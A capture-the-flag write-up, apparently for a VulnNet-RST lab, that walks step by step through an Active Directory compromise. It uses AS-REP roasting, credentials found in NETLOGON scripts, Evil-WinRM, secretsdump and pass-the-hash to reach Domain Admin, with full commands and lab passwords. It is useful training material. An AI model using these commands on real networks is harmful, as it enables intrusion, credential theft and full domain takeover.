04 AS-REP Roasting

AS-REP Roasting targets accounts with Kerberos Pre-Authentication disabled. These accounts respond to unauthenticated requests with an encrypted ticket — crackable entirely offline, no lockout risk.

bashGetNPUsers — AS-REP Roast
impacket-GetNPUsers vulnnet-rst.local/ \
  -usersfile users.txt \
  -dc-ip 10.113.135.127 \
  -request
outputHash Captured
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:...
AS-REP hash captured for t-skid ✔️

06 NETLOGON Share Access

With valid credentials, authenticated shares are now accessible. NETLOGON is always worth checking — it often contains scripts used for automated domain tasks:

bashAccess NETLOGON
smbclient //10.113.135.127/NETLOGON \
  -U vulnnet-rst.local/t-skid
# Password: tj072889*

smb: \> ls
smb: \> get ResetPassword.vbs
🚨 Scripts in NETLOGON frequently contain hardcoded credentials — always read them fully.

07 Credential Discovery

bashRead the Script
cat ResetPassword.vbs
outputHardcoded Credentials Found

💡 a-whitehat — a higher-privileged account. Likely has WinRM or admin access.

08 Remote Access via WinRM

bashEvil-WinRM
evil-winrm -i 10.113.135.127 \
  -u a-whitehat \
  -p 'bNdKVkjv3RR9ht'
Shell obtained as a-whitehat ✔️
powershellUser Flag
type C:\Users\a-whitehat\Desktop\user.txt

09 Dumping Domain Credentials

A privileged account means we can dump all domain hashes remotely — no need to be on the DC physically:

bashsecretsdump
secretsdump.py \
  vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.113.135.127
Administrator NTLM hash extracted ✔️ — no need to crack it. Pass-the-Hash works directly.

10 Pass-the-Hash → Domain Admin

In Windows environments, NTLM hashes authenticate just as well as plaintext passwords:

bashPass-the-Hash
evil-winrm -i 10.113.135.127 \
  -u Administrator \
  -H <NTLM_HASH>
powershellRoot Flag
type C:\Users\Administrator\Desktop\root.txt
Domain Administrator compromised ✔️

12 Skills Demonstrated

  • SMB anonymous enumeration — always check before authenticating.
  • RID brute-forcing to enumerate domain accounts with no credentials.
  • AS-REP Roasting — offline hash cracking with zero lockout risk.
  • Credential harvesting from scripts left in NETLOGON shares.
  • Lateral movement via Evil-WinRM.
  • Remote domain credential dumping via secretsdump.
  • Pass-the-Hash — NTLM hashes are as good as passwords in Windows.
Final Thought: Textbook AD attack chain — Anonymous Access → Kerberos Abuse → Credential Reuse → Domain Takeover. Real environments get compromised the exact same way.
